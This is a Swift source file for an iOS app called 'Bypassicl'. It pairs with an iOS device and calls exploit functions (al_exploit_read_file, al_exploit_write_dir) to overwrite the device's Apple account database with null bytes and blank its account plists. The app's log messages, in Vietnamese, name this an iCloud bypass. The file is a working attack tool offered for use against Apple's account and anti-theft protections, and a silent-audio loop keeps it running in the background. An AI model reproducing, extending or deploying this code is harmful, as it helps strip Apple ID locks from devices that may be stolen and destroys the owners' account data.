// ============================================================
// AirliftService.swift — Bypassicl (Final & Stable)
// ============================================================

import Foundation
import Combine
import UniformTypeIdentifiers
import Network
import AVFoundation
import UIKit
import UserNotifications
import BackgroundTasks

@MainActor
class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
    static let shared = AirliftService()
    
    @Published var logs: String = "=== Bypassicl Log ===\n"
    @Published var isPairing = false
    @Published var currentPin: String? = nil
    @Published var pairingFilePath: String? = nil
    @Published var lastDeviceName: String? = nil
    
    @Published var isProcessing = false
    @Published var showAlert = false
    @Published var alertMessage = ""
    @Published var isVPNConnected = false 
    
    private var netService: NetService?
    private var audioPlayer: AVAudioPlayer?
    private var bgTask: BGContinuedProcessingTask?
    private var pairingStarted = false
    private var taskFinished = false
    private var vpnTimer: Timer?
    
    private let localNetwork = LocalNetworkAuthorization()
    private let accountsDir = "/var/mobile/Library/Accounts"
    private let prefsDir = "/var/mobile/Library/Preferences"
    
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
    private let plistFiles = ["com.apple.accountsd.plist", "com.apple.mobilemeaccounts.plist", "com.apple.accounts.plist", "com.apple.appleaccount.plist"]
    
    var backupDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0].appendingPathComponent("AccountsBackup")
    }
    private var documentsDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }
    var hasCompleteBackup: Bool {
        let fm = FileManager.default
        return targetFiles.allSatisfy { fm.fileExists(atPath: backupDir.appendingPathComponent($0).path) }
    }
    
    override init() {
        super.init()
        registerBackgroundTask()
        startVPNMonitor()
        _ = connect()
    }
    
    func log(_ message: String) {
        self.logs += message + "\n"
        print(message)
    }
    
    private func startVPNMonitor() {
        checkVPNNow()
        vpnTimer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] _ in
            self?.checkVPNNow()
        }
        RunLoop.main.add(vpnTimer!, forMode: .common)
    }
    
    private func checkVPNNow() {
        var address: UnsafeMutablePointer<ifaddrs>?
        var isUp = false
        if getifaddrs(&address) == 0 {
            var ptr = address
            while ptr != nil {
                let interface = ptr!.pointee
                let name = String(cString: interface.ifa_name)
                let family = interface.ifa_addr.pointee.sa_family
                if name.hasPrefix("utun") && family == UInt8(AF_INET) {
                    var addr = interface.ifa_addr.pointee
                    var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                    getnameinfo(&addr, socklen_t(interface.ifa_addr.pointee.sa_len), &hostname, socklen_t(hostname.count), nil, socklen_t(0), NI_NUMERICHOST)
                    let ip = String(cString: hostname)
                    if ip.hasPrefix("10.7.") { isUp = true; break }
                }
                ptr = interface.ifa_next
            }
            freeifaddrs(address)
        }
        if self.isVPNConnected != isUp {
            self.isVPNConnected = isUp
            self.log(isUp ? "✅ Đã phát hiện VPN LocalDev" : "⚠️ VPN LocalDev đã tắt")
        }
    }
    
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        if let rawString = String(validatingUTF8: msg) {
            let cleanString = rawString.replacingOccurrences(of: "\u{001B}\\[[0-9;]*[a-zA-Z]", with: "", options: .regularExpression)
            DispatchQueue.main.async { service.log("[Airlift] \(cleanString)") }
        }
    }
    
    private static let pinCallback: ALPairPinCb = { pin, ctx in
        guard let ctx = ctx, let pin = pin else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let pinStr = String(cString: pin)
        DispatchQueue.main.async {
            service.currentPin = pinStr
            service.log("🔐 PIN READY: \(pinStr)")
            service.presentPin(pinStr)
        }
    }
    
    private static let readyCallback: ALPairReadyCb = { ctx, serviceID, port, keys, vals, count in
        guard let ctx = ctx, let serviceID = serviceID else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let id = String(cString: serviceID)
        var txt: [String: Data] = [:]
        if let keys = keys, let vals = vals {
            for i in 0..<Int(count) {
                guard let k = keys[i], let v = vals[i] else { continue }
                txt[String(cString: k)] = Data(String(cString: v).utf8)
            }
        }
        DispatchQueue.main.async { service.startAdvertising(serviceID: id, port: Int32(port), txt: txt) }
    }
    
    nonisolated private func registerBackgroundTask() {
        if #available(iOS 26.0, *) {
            let taskId = (Bundle.main.bundleIdentifier ?? "com.bypassicl.app") + ".pairing"
            BGTaskScheduler.shared.register(forTaskWithIdentifier: taskId, using: DispatchQueue.main) { task in
                guard let task = task as? BGContinuedProcessingTask else { return }
                MainActor.assumeIsolated { AirliftService.shared.runPairing(task: task) }
            }
        }
    }
    
    private func startKeepAliveAudio() {
        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(.playback, options: [.mixWithOthers])
            try session.setActive(true)
            let sr: UInt32 = 8000, ns: UInt32 = 8000, ds = ns * 2
            var wav = Data()
            wav.append("RIFF".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: (36 + ds).littleEndian) { Data($0) })
            wav.append("WAVEfmt ".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: UInt32(16).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: sr.littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: (sr * 2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(16).littleEndian) { Data($0) })
            wav.append("data".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: ds.littleEndian) { Data($0) })
            wav.append(Data(count: Int(ds)))

            let player = try AVAudioPlayer(data: wav)
            player.numberOfLoops = -1
            player.volume = 0.01
            player.play()
            audioPlayer = player
        } catch { log("⚠️ Audio error: \(error.localizedDescription)") }
    }

    private func stopKeepAliveAudio() {
        audioPlayer?.stop()
        audioPlayer = nil
        try? AVAudioSession.sharedInstance().setActive(false)
    }
    
    func startPairingOnDevice() {
        guard !isPairing else { return }
        self.isPairing = true
        self.currentPin = nil
        self.pairingStarted = false
        self.log("[*] Starting Pair on Device...")
        
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound]) { _, _ in }
        self.startKeepAliveAudio()
        Task.detached { [weak self] in _ = await self?.localNetwork.request() }
        self.submitBackgroundTask()
    }
    
    private func submitBackgroundTask() {
        if #available(iOS 26.0, *) {
            let taskId = (Bundle.main.bundleIdentifier ?? "com.bypassicl.app") + ".pairing"
            let request = BGContinuedProcessingTaskRequest(identifier: taskId, title: "Bypassicl", subtitle: "Waiting for a device…")
            request.strategy = .queue
            do { try BGTaskScheduler.shared.submit(request) } catch {}
        }
        self.runPairing(task: nil)
    }
    
    private func runPairing(task: BGContinuedProcessingTask?) {
        guard !pairingStarted else { return }
        pairingStarted = true
        taskFinished = false
        bgTask = task
        
        task?.progress.totalUnitCount = 100
        task?.progress.completedUnitCount = 5
        task?.expirationHandler = { [weak self] in
            guard let self = self else { return }
            Task { @MainActor in
                self.isPairing = false
                self.finishTask(success: false)
            }
        }
        
        let outPath = self.documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing").path
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        DispatchQueue.global(qos: .userInitiated).async {
            var isSuccess = false
            var finalPath: String? = nil
            var finalName: String? = nil

            while true {
                var shouldContinue = false
                DispatchQueue.main.sync { shouldContinue = self.isPairing }
                if !shouldContinue { break }

                var result = ALPairResult()
                let code = al_pairing_run_host(
                    "0.0.0.0", 0, "Bypassicl", "Mac17,7", outPath, nil,
                    AirliftService.readyCallback, AirliftService.pinCallback, ctx, &result
                )

                if code == 0 {
                    isSuccess = true
                    if let p = result.pairing_file_path { finalPath = String(cString: p) }
                    if let n = result.device_name { finalName = String(cString: n) }
                    al_pairing_result_free(&result)
                    break
                } else {
                    al_pairing_result_free(&result)
                    DispatchQueue.main.async { self.currentPin = nil }
                    Thread.sleep(forTimeInterval: 0.5)
                }
            }

            DispatchQueue.main.async {
                self.pairingStarted = false
                self.isPairing = false
                self.currentPin = nil
                self.stopAdvertising()
                self.stopKeepAliveAudio()

                if isSuccess {
                    self.pairingFilePath = finalPath
                    self.lastDeviceName = finalName
                    self.log("✅ Pairing successful!")
                    self.alertMessage = "Pairing Thành Công!"
                } else {
                    self.log("⏹ Pairing cancelled.")
                }
                self.showAlert = true
                self.finishTask(success: isSuccess)
            }
        }
    }
    
    private func finishTask(success: Bool) {
        guard !taskFinished else { return }
        taskFinished = true
        if #available(iOS 26.0, *) {
            bgTask?.setTaskCompleted(success: success)
        }
        bgTask = nil
    }
    
    private func startAdvertising(serviceID: String, port: Int32, txt: [String: Data]) {
        stopAdvertising()
        let service = NetService(domain: "", type: "_remotepairing-pairable-host._tcp.", name: serviceID, port: port)
        service.setTXTRecord(NetService.data(fromTXTRecord: txt))
        service.schedule(in: .main, forMode: .common)
        service.delegate = self
        service.publish()
        netService = service
        log("🔊 Bonjour publishing: \(serviceID) @ \(port)")
    }
    
    private func stopAdvertising() {
        netService?.stop()
        netService = nil
    }
    
    private func presentPin(_ pin: String) {
        if #available(iOS 26.0, *) {
            bgTask?.progress.completedUnitCount = 50
            bgTask?.updateTitle("Bypassicl", subtitle: "Enter code \(pin)")
        }
        let content = UNMutableNotificationContent()
        content.title = "Bypassicl pairing code"
        content.body = "Enter \(pin) on this device to pair."
        content.sound = .default
        UNUserNotificationCenter.current().add(UNNotificationRequest(identifier: "bypassicl.pin", content: content, trigger: nil))
    }

    func connect() -> Bool {
        if pairingFilePath == nil || !FileManager.default.fileExists(atPath: pairingFilePath!) {
            for name in ["pairingRecord.mobiledevicepairing", "pairingRecord.plist", "pairing.plist"] {
                let url = documentsDir.appendingPathComponent(name)
                if FileManager.default.fileExists(atPath: url.path) {
                    pairingFilePath = url.path
                    break
                }
            }
        }
        return pairingFilePath != nil && FileManager.default.fileExists(atPath: pairingFilePath!)
    }

    func importPairingFile(from url: URL) {
        let accessing = url.startAccessingSecurityScopedResource()
        defer { if accessing { url.stopAccessingSecurityScopedResource() } }
        do {
            try FileManager.default.createDirectory(at: documentsDir, withIntermediateDirectories: true)
            let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")
            try Data(contentsOf: url).write(to: dest, options: .atomic)
            self.pairingFilePath = dest.path
            self.log("✅ Pairing file imported")
            self.alertMessage = "Import Pairing File Thành Công!"
            self.showAlert = true
        } catch { log("❌ Import failed: \(error.localizedDescription)") }
    }

    nonisolated private func ffi_read_file_internal(pairingPath: String, iosPath: String) -> Data? {
        var outData: UnsafeMutablePointer<UInt8>? = nil
        var outLen: size_t = 0
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        let result = al_exploit_read_file(pairingPath, iosPath, AirliftService.logCallback, ctx, &outData, &outLen, &outError)
        defer {
            if let e = outError { al_string_free(e) }
            if let d = outData { al_bytes_free(d, outLen) }
        }
        if result == 0 {
            if let ptr = outData, outLen > 0 { return Data(bytes: ptr, count: Int(outLen)) }
            else { return Data() }
        }
        return nil
    }

    nonisolated private func ffi_write_dir_internal(pairingPath: String, sourceDir: String, targetDir: String) -> Bool {
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        let result = al_exploit_write_dir(pairingPath, sourceDir, targetDir, AirliftService.logCallback, ctx, &outError)
        defer { if let e = outError { al_string_free(e) } }
        return result == 0
    }

    // ============================================================
    // BYPASS: DESTRUCTIVE WIPE (0x00 & PLISTS)
    // ============================================================
    func bypassICloud() {
        guard !isProcessing else { return }
        guard connect(), let pairingPath = pairingFilePath else {
            log("❌ Bypass failed: Missing Pairing File.")
            return
        }
        
        isProcessing = true
        log("[*] Bắt đầu Bypass (Destructive Wipe)...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self = self else { return }
            let fm = FileManager.default
            
            // 1. Backup
            try? fm.createDirectory(at: self.backupDir, withIntermediateDirectories: true)
            if !self.hasCompleteBackup {
                DispatchQueue.main.async { self.log("[*] Đang backup 3 file gốc...") }
                for file in self.targetFiles {
                    let path = "\(self.accountsDir)/\(file)"
                    if let data = self.ffi_read_file_internal(pairingPath: pairingPath, iosPath: path) {
                        try? data.write(to: self.backupDir.appendingPathComponent(file), options: .atomic)
                    }
                }
            }
            
            // 2. Ghi file 0x00 phá DB
            let garbageDir = fm.temporaryDirectory.appendingPathComponent("garbage_\(UUID().uuidString)")
            try? fm.createDirectory(at: garbageDir, withIntermediateDirectories: true)
            let garbageData = Data(repeating: 0x00, count: 1024 * 1024) // 1MB null bytes
            for file in self.targetFiles {
                try? garbageData.write(to: garbageDir.appendingPathComponent(file), options: .atomic)
            }
            
            let writeAccounts = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: garbageDir.path, targetDir: self.accountsDir)
            DispatchQueue.main.async { self.log(writeAccounts ? "✅ Đã phá file SQLite" : "❌ Lỗi ghi SQLite") }
            
            // 3. Xóa plist
            let plistGarbageDir = fm.temporaryDirectory.appendingPathComponent("plist_\(UUID().uuidString)")
            try? fm.createDirectory(at: plistGarbageDir, withIntermediateDirectories: true)
            let emptyData = Data() // 0-byte
            for file in self.plistFiles {
                try? emptyData.write(to: plistGarbageDir.appendingPathComponent(file), options: .atomic)
            }
            
            let writePrefs = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: plistGarbageDir.path, targetDir: self.prefsDir)
            DispatchQueue.main.async { self.log(writePrefs ? "✅ Đã xóa file Plist" : "❌ Lỗi ghi Plist") }
            
            Thread.sleep(forTimeInterval: 1.0)
            
            DispatchQueue.main.async {
                if writeAccounts && writePrefs {
                    self.log("🎉 BYPASS THÀNH CÔNG! Hãy vuốt tắt app Cài đặt rồi mở lại.")
                    self.alertMessage = "Bypass Thành Công! Hãy vuốt tắt app Cài đặt (Settings) và mở lại để áp dụng."
                } else {
                    self.log("❌ Bypass thất bại.")
                    self.alertMessage = "Bypass thất bại."
                }
                self.isProcessing = false
                self.showAlert = true
            }
            
            try? fm.removeItem(at: garbageDir)
            try? fm.removeItem(at: plistGarbageDir)
        }
    }

    // ============================================================
    // RESTORE: TẠO SQLITE RỖNG (SẠCH APPLE ID)
    // ============================================================
    func restoreOriginalAccounts() {
        guard !isProcessing else { return }
        guard connect(), let pairingPath = pairingFilePath else {
            log("❌ Restore failed: Missing Pairing File.")
            return
        }
        
        isProcessing = true
        log("[*] Bắt đầu Restore (Tạo DB sạch)...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self = self else { return }
            let fm = FileManager.default
            
            var emptyDB = Data(count: 4096)
            let header: [UInt8] = [
                0x53, 0x51, 0x4C, 0x69, 0x74, 0x65, 0x20, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x20, 0x33, 0x00,
                0x10, 0x00, 0x01, 0x01, 0x00, 0x40, 0x20, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x7A, 0x00
            ]
            emptyDB.replaceSubrange(0..<100, with: header)
            
            let cleanDir = fm.temporaryDirectory.appendingPathComponent("clean_\(UUID().uuidString)")
            try? fm.createDirectory(at: cleanDir, withIntermediateDirectories: true)
            
            for file in self.targetFiles {
                try? emptyDB.write(to: cleanDir.appendingPathComponent(file), options: .atomic)
            }
            _ = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: cleanDir.path, targetDir: self.accountsDir)
            
            let plistEmptyDir = fm.temporaryDirectory.appendingPathComponent("plist_\(UUID().uuidString)")
            try? fm.createDirectory(at: plistEmptyDir, withIntermediateDirectories: true)
            let emptyData = Data()
            for file in self.plistFiles {
                try? emptyData.write(to: plistEmptyDir.appendingPathComponent(file), options: .atomic)
            }
            _ = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: plistEmptyDir.path, targetDir: self.prefsDir)
            
            Thread.sleep(forTimeInterval: 1.0)
            
            DispatchQueue.main.async {
                self.log("✅ RESTORE HOÀN TẤT! Đã tạo DB sạch, không có Apple ID.")
                self.alertMessage = "Restore Thành Công! Đã xóa sạch Apple ID."
                self.isProcessing = false
                self.showAlert = true
            }
            
            try? fm.removeItem(at: cleanDir)
            try? fm.removeItem(at: plistEmptyDir)
        }
    }
}

@MainActor
final class LocalNetworkAuthorization {
    private var browser: NWBrowser?
    private var listener: NWListener?
    private var continuation: CheckedContinuation<Bool, Never>?
    private let probeType = "_bypassiclprobe._tcp"

    func request(timeout: TimeInterval = 5) async -> Bool {
        await withCheckedContinuation { (cont: CheckedContinuation<Bool, Never>) in
            self.continuation = cont
            let params = NWParameters.tcp
            params.includePeerToPeer = true

            let listener = try? NWListener(using: params)
            listener?.service = NWListener.Service(name: "BypassiclProbe", type: probeType)
            listener?.newConnectionHandler = { $0.cancel() }
            listener?.stateUpdateHandler = { [weak self] state in
                if case .failed = state { Task { @MainActor in self?.finish(false) } }
            }
            self.listener = listener

            let browser = NWBrowser(for: .bonjour(type: probeType, domain: nil), using: params)
            browser.stateUpdateHandler = { [weak self] state in
                if case .failed = state { Task { @MainActor in self?.finish(false) } }
            }
            browser.browseResultsChangedHandler = { [weak self] results, _ in
                if !results.isEmpty { Task { @MainActor in self?.finish(true) } }
            }
            self.browser = browser

            listener?.start(queue: .main)
            browser.start(queue: .main)

            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
                Task { @MainActor in self?.finish(false) }
            }
        }
    }

    private func finish(_ authorized: Bool) {
        guard let cont = continuation else { return }
        continuation = nil
        cont.resume(returning: authorized)
        browser?.cancel(); browser = nil
        listener?.cancel(); listener = nil
    }
}